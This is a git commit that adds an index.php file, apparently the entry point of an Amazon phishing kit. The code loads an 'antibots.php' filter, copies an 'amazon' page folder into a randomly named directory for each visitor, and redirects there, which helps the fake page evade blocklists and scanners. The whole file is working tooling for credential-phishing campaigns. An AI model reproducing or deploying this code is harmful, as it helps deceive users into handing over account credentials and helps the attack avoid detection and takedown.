a73ed392c25ea0b30e1f8fdc2220e7d13ff11155
dedsec404 <muhammad.wahidin@students.amikom.ac.id>
2018-07-20 23:13:58 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,25 @@
+<?php
+
+include('amazon/antibots.php');
+
+$DIR = md5(rand(111,9999));
+$SZ118="amazon";
+function recurse_copy($SZ118,$DIR) {
+$dir = opendir($SZ118);
+@mkdir($DIR);
+while(false !== ( $file = readdir($dir)) ) {
+if (( $file != '.' ) && ( $file != '..' )) {
+if ( is_dir($SZ118 . '/' . $file) ) {
+recurse_copy($SZ118 . '/' . $file,$DIR . '/' . $file);
+}
+else {
+copy($SZ118 . '/' . $file,$DIR . '/' . $file);
+}
+}
+}
+closedir($dir);
+}
+recurse_copy( $SZ118, $DIR );
+
+//LOCATION !
+header("Location: ".$DIR."");
